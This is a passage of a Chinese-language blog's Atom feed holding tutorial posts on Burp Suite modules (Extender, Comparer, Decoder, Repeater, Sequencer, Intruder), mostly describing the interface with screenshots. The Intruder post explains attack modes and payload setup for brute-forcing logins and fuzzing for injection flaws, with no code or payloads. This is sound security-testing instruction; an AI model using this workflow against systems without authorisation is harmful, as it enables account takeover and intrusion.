    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;BurpSuite系列之Project options模块(项目选择)&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite系列之Extender模块</title>
    <link href="http://archimesan.me/2018/04/16/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BExtender%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/04/16/BurpSuite系列之Extender模块/</id>
    <published>2018-04-16T10:49:10.000Z</published>
    <updated>2019-03-26T15:18:40.343Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Extender模块(扩展器)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp在软件中提供了支持第三方拓展插件的功能，方便使用者编写自己的自定义插件或从插件商店中安装拓展插件。Burp扩展程序可以以多种方式支持自定义Burp的行为，例如：修改HTTP请求和响应，自定义UI，添加自定义扫描程序检查以及访问关键运行时信息，包括代理历史记录，目标站点地图和扫描程序问题等。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p>Extender主要由四个模块组成:</p><p>1.Extensions  扩展<br>2.BApp Store 应用程序商店<br>3.APIS<br>4.Options  选项</p><h2 id="Extensions-扩展"><a href="#Extensions-扩展" class="headerlink" title="Extensions  扩展"></a>Extensions  扩展</h2><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065233876.png" alt></p><p>日志信息的输出有三种方式：<br>a)系统控制台输出<br>b)存储到指定的文件中<br>c)Burp的界面输出 默认情况下，会选择Burp的界面输出。</p><h2 id="BApp-Store-应用程序商店"><a href="#BApp-Store-应用程序商店" class="headerlink" title="BApp Store 应用程序商店"></a>BApp Store 应用程序商店</h2><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065243546.png" alt></p><p>从图中我们可以看出，左边为各个插件的应用列表，当选中某个插件后，右侧显示的为该插件的描述信息和安装信息。 如果我们需要使用某个插件，则点击右侧下方的【install】按钮，进行安装。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065257967.png" alt></p><p>此时，安装按钮置为灰色，同时显示为【installing】，右下角也显示安装中，如上图。安装完成后，界面会显示重新安装【Reinstall】和插件评分按钮【Submit rating】，作为插件商店的用户推荐。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065307128.png" alt></p><p>安装完毕后，在Burp Extender 的Extension的Tab页面中，会自动显示已加载的插件列表。通过插件列表的管<br>理，我们可以对插件进行后期的维护。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065320378.png" alt></p><p>当然，除了从应用商店自动安装插件外，我们也可以下载插件，进行手工安装。如下图：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065327890.png" alt></p><h2 id="APIS"><a href="#APIS" class="headerlink" title="APIS"></a>APIS</h2><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065337811.png" alt></p><h2 id="Options-选项"><a href="#Options-选项" class="headerlink" title="Options  选项"></a>Options  选项</h2><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065346605.png" alt></p><p>下面还有一个Ruby的环境和上面的差不多。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;BurpSuite系列之Extender模块(扩展器)&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite系列之Comparer模块</title>
    <link href="http://archimesan.me/2018/04/10/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BComparer%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/04/10/BurpSuite系列之Comparer模块/</id>
    <published>2018-04-10T10:46:48.000Z</published>
    <updated>2019-03-26T15:18:40.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Comparer模块(比较器)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp Comparer在Burp Suite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别。使用中的场景可能是：<br>1.枚举用户名过程中，对比分析登陆成功和失败时，服务器端反馈结果的区别。<br>2.使用 Intruder 进行攻击时，对于不同的服务器端响应，可以很快的分析出两次响应的区别在哪里。<br>3.进行SQL注入的盲注测试时，比较两次响应消息的差异，判断响应结果与注入条件的关联关系。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Comparer模块/20190326064824067.png" alt></p><p>对于Comparer的使用，主要有两个环节组成，先是数据加载，然后是差异分析。 Comparer数据加载的方式常用的有：</p><p>1.从其他Burp工具通过上下文菜单转发过来。<br>2.直接粘贴。<br>3.从文件加载三种方式。</p><p>当加载完毕后，如果你选择了两次不同的请求或应答消息，则下发的比较按钮将被激活，可以选择文本比较或者字节比较。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Comparer模块/20190326064836055.png" alt></p><p>如果点击了【words】或者【bytes】，则进入比对界面，页面自动通过背景颜色显示数据的差异。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;BurpSuite系列之Comparer模块(比较器)&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite系列之decoder模块</title>
    <link href="http://archimesan.me/2018/04/06/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8Bdecoder%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/04/06/BurpSuite系列之decoder模块/</id>
    <published>2018-04-06T10:42:05.000Z</published>
    <updated>2019-03-26T15:18:40.352Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之decoder模块(编码模块)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp Decoder是Burp Suite中一款编码解码工具，将原始数据转换成各种编码和哈希表的简单工具，它能够智能地识别多种编码格式采用启发式技术。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之decoder模块/20190326064451278.png" alt></p><p>通过有请求的任意模块的右键菜单send to Decoder或输入数据选择相应的数据格式即可进行解码编码操作，或直接点击Smart decoding进行智能解码。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之decoder模块/20190326064615554.png" alt></p><p>更重要的是，对于同一个数据，我们可以在Decoder的界面，进行多次编码解码的转换。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之decoder模块/20190326064630446.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;BurpSuite系列之decoder模块(编码模块)&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite系列之Repeater模块</title>
    <link href="http://archimesan.me/2018/04/04/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BRepeater%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/04/04/BurpSuite系列之Repeater模块/</id>
    <published>2018-04-04T09:14:43.000Z</published>
    <updated>2019-03-26T15:18:40.347Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Repeater模块(中继器)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp Repeater 是一个手动修改并补发个别 HTTP 请求，并分析他们的响应的工具。它最大的用途就是和其他 Burp Suite 工具结合起来。你可以从目标站点地图，从 Burp Proxy 浏览记录，或者从 Burp Intruder 攻击结果上的请求，发送到 Repeater 上，并手动调整这个请求来微调对漏洞的探测或攻击。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Repeater模块/20190326051636510.png" alt><br>1.可以从Proxy history、site map、Scanner等模块中右键菜单send to repeater发送到repeater，对页面数据进行修改发送。<br>2.点击go，发送请求，右边响应请求。<br>3.可以通过“&lt;“和”&gt;“来返回上一次和下一个操作。<br>4.单击”x“可以删除当前测试请求页面。<br>5.底部的功能用于搜索条件，可以用正则表达式，底部右边显示匹配结果数。<br>raw — 这显示纯文本格式的消息。在文本面板的底部有一个搜索和加亮的功能，可以用来快速地定位出消息里的感兴趣的字符串，如出错消息。搜索栏左边的弹出项让你能控制状况的灵敏度，以及是否使用简单文本或者十六进制搜索。<br>params — 对于包含参数(URL 查询字符串，cookie 头，或者消息体)的请求，这个选项把这些参数分析为名字/值的格式，这就可以简单地随他们进行查看和修改了。<br>headers — 这里是以名字/值的格式来显示 HTTP 的消息头，并且也以原始格式显示了消息体。<br>hex — 这里允许你直接编辑由原始二进制数据组成的消息。如果在文本编辑器修改，某种类型的传输(如，MIME 编码的浏览器请求)包含了可能损坏的二进制内容。为了修改这类消息，应该使用十六进制编辑器。<br>该模块的设置在菜单栏 Repeater中，主要选项如下：<br><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Repeater模块/20190326051718288.png" alt><br>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;BurpSuite系列之Repeater模块(中继器)&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite系列之Sequencer模块</title>
    <link href="http://archimesan.me/2018/04/02/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BSequencer%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/04/02/BurpSuite系列之Sequencer模块/</id>
    <published>2018-04-02T09:19:20.000Z</published>
    <updated>2019-03-26T10:59:53.047Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Sequencer模块(定序器)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp Sequencer是一种用于分析数据项的一个样本中的随机性质量的工具。你可以用它来测试应用程序的session tokens(会话tokens)或其他重要数据项的本意是不可预测的，比如反弹CSRF tokens，密码重置tokens等。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p>Burp Sequencer主要由三个模块组成:</p><p>1：Live capture 信息截取<br>2：Manual load 手动加载<br>3：Analysis options 选项分析</p><h2 id="Live-capture-信息截取"><a href="#Live-capture-信息截取" class="headerlink" title="Live capture 信息截取"></a>Live capture 信息截取</h2><p>选项1：Select Live Capture Request</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052051786.png" alt></p><p>选项2：Token Location Within Response</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052109249.png" alt></p><p>选项3：Live Capture Options</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052123554.png" alt></p><h2 id="Manual-load-手动加载"><a href="#Manual-load-手动加载" class="headerlink" title="Manual load 手动加载"></a>Manual load 手动加载</h2><p>选项1：Manual Load</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052159788.png" alt></p><h2 id="Analysis-options-选项分析"><a href="#Analysis-options-选项分析" class="headerlink" title="Analysis options 选项分析"></a>Analysis options 选项分析</h2><p>选项1：Token Handling  令牌处理</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052218850.png" alt></p><p>选项2：Token Analysis  令牌分析</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052227473.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;BurpSuite系列之Sequencer模块(定序器)&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Burpsuite系列之Intruder模块</title>
    <link href="http://archimesan.me/2018/03/28/Burpsuite%E7%B3%BB%E5%88%97%E4%B9%8BIntruder%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/03/28/Burpsuite系列之Intruder模块/</id>
    <published>2018-03-28T08:56:20.000Z</published>
    <updated>2019-03-26T11:00:49.070Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>Burpsuite系列之Intruder模块（暴力破解）<br><a id="more"></a></p><h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。</p><h1 id="二、模块说明"><a href="#二、模块说明" class="headerlink" title="二、模块说明"></a>二、模块说明</h1><p>Burp Intruder主要有四个模块组成:</p><p>1：Target 用于配置目标服务器进行攻击的详细信息。<br>2：Positions  设置Payloads的插入点以及攻击类型（攻击模式）。<br>3：Payloads  设置payload，配置字典<br>4：Opetions   此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p><h2 id="Target-目标选项-Target-tab"><a href="#Target-目标选项-Target-tab" class="headerlink" title="Target 目标选项(Target tab)"></a>Target 目标选项(Target tab)</h2><p>这个选项是用来配置目标服务器的细节：<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326045934997.png" alt></p><h2 id="Positions-位置选项-Positions-tab"><a href="#Positions-位置选项-Positions-tab" class="headerlink" title="Positions 位置选项(Positions tab)"></a>Positions 位置选项(Positions tab)</h2><p>这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板：<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326045943778.png" alt><br>使用一对§字符来标记出有效负荷的位置，在这两个符号直接包含了模板文本的内容。当把一个有效负荷放置到一个给出的请求的特殊位置上时，就把这§符号放到这个位置，然后在两个符号之间的出现的文本都会被有效负荷替换。当有个特殊位置没有为一个给出的请求安排有效负荷时(这只适用”sniper”攻击类型)，那个位置的§字符会被删除，出现在它们之间的文本不会变化。</p><p>当使用 Burp Suite 发送一个其他地方的请求时，Burp Intruder 会对你最想放置有效负荷的位置做一个最好的猜测，并且它把这些放置在每个 URL 和主体参数的值里，以及每个cookie 里。每个标记和它中间的文本都会被加亮以显得更清晰。你可以使用 Intruder 菜单上的选项标记的位置是要替换还是附加现有的参数值。在上面的请求编辑器里，指出了定义位置的数量和文本模板的大小。<br>你可以使用选项上的按钮来控制位置上的标记：</p><h4 id="add-§-—-在当前光标位置插入一个位置标记。"><a href="#add-§-—-在当前光标位置插入一个位置标记。" class="headerlink" title="add § — 在当前光标位置插入一个位置标记。"></a>add § — 在当前光标位置插入一个位置标记。</h4><h3 id="clear-§-—-删除整个模板或选中的部分模板里的位置标记。"><a href="#clear-§-—-删除整个模板或选中的部分模板里的位置标记。" class="headerlink" title="clear § — 删除整个模板或选中的部分模板里的位置标记。"></a>clear § — 删除整个模板或选中的部分模板里的位置标记。</h3><h3 id="auto-§-—-这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞-SQL-注入-快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。"><a href="#auto-§-—-这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞-SQL-注入-快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。" class="headerlink" title="auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞(SQL 注入)快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。"></a>auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞(SQL 注入)快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。</h3><h3 id="refresh-—-如果需要，可以刷新编辑器里有颜色的代码。"><a href="#refresh-—-如果需要，可以刷新编辑器里有颜色的代码。" class="headerlink" title="refresh — 如果需要，可以刷新编辑器里有颜色的代码。"></a>refresh — 如果需要，可以刷新编辑器里有颜色的代码。</h3><h3 id="clear-—-删除整个编辑器内容。"><a href="#clear-—-删除整个编辑器内容。" class="headerlink" title="clear — 删除整个编辑器内容。"></a>clear — 删除整个编辑器内容。</h3><h2 id="Payloads-有效负荷选项-Payloads-tab"><a href="#Payloads-有效负荷选项-Payloads-tab" class="headerlink" title="Payloads 有效负荷选项(Payloads tab)"></a>Payloads 有效负荷选项(Payloads tab)</h2><p>这个选项是用来配置一个或多个有效负荷的集合。如果定义了”cluster bomb”和”pitchfork”攻击类型，然后必须为每定义的有效负荷位置(最多8个)配置一个单独的有效负荷。使用”payload set”下拉菜单选择要配置的有效负荷。<br>选项1：Payload Sets Payload数量类型设置<br>选项2：Payload Opetions[Simple list]  该选项会根据选项1中Payload type的设置而改变<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050105567.png" alt></p><p>选项3：Payload Processing 对生成的Payload进行编码、加密、截取等操作<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050110646.png" alt></p><p>选项4：Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050118376.png" alt></p><h2 id="Opetions-选项卡-Options-tab"><a href="#Opetions-选项卡-Options-tab" class="headerlink" title="Opetions  选项卡(Options tab)"></a>Opetions  选项卡(Options tab)</h2><p>此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。<br>选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。</p><p>如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。</p><p>如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。</p><p>如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。<br>选项2：Request Engine 设置发送请求的线程、超时重试等。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050127313.png" alt></p><p>选项3：Attack Results 设置攻击结果的显示。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050133518.png" alt></p><p>选项4：Grep – Match 在响应中找出存在指定的内容的一项。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050138437.png" alt></p><p>选项5：Grep – Extract 通过正则提取返回信息中的内容。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050144205.png" alt></p><p>选项6：Grep – Payloads  这些设置可以用于包含已提交的有效负载的反射的标志结果项目。如果启用了此选项，BurpSuite会添加包含一个复选框指示当前负载的值在每个响应发现新的结果列。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050150284.png" alt></p><p>选项7：Redirections 重定向响应，控制Burp在进行攻击时如何处理重定向。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050203273.png" alt></p><h1 id="Burp-Suite-Intruder的4种攻击类型"><a href="#Burp-Suite-Intruder的4种攻击类型" class="headerlink" title="Burp Suite Intruder的4种攻击类型"></a>Burp Suite Intruder的4种攻击类型</h1><h2 id="Sniper（狙击手模式）"><a href="#Sniper（狙击手模式）" class="headerlink" title="Sniper（狙击手模式）"></a>Sniper（狙击手模式）</h2><p>狙击手模式使用一组payload集合，它一次只使用一个payload位置，假设你标记了两个位置“A”和“B”，payload值为“1”和“2”，那么它攻击会形成以下组合（除原始数据外）：<img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/attack NO.location Alocation B11no replace22no replace3no replace14no replace2二Battering ram（.png" alt="attack NO.location Alocation B11no replace22no replace3no replace14no replace2"></p><h2 id="Battering-ram（攻城锤模式）"><a href="#Battering-ram（攻城锤模式）" class="headerlink" title="Battering ram（攻城锤模式）"></a>Battering ram（攻城锤模式）</h2><p>攻城锤模式与狙击手模式类似的地方是，同样只使用一个payload集合，不同的地方在于每次攻击都是替换所有payload标记位置，而狙击手模式每次只能替换一个payload标记位置。<img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/attack NO.location Alocation B111222.png" alt="attack NO.location Alocation B111222"></p><h2 id="Pitchfork（草叉模式）"><a href="#Pitchfork（草叉模式）" class="headerlink" title="Pitchfork（草叉模式）"></a>Pitchfork（草叉模式）</h2><p>草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，则攻击模式如下：<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326051341304.png" alt></p><h2 id="Cluster-bomb（集束炸弹模式）"><a href="#Cluster-bomb（集束炸弹模式）" class="headerlink" title="Cluster bomb（集束炸弹模式）"></a>Cluster bomb（集束炸弹模式）</h2><p>集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，还是上面的例子，如果用集束炸弹模式进行攻击，则除baseline请求外，会有四次请求：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326051412843.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;Burpsuite系列之Intruder模块（暴力破解）&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
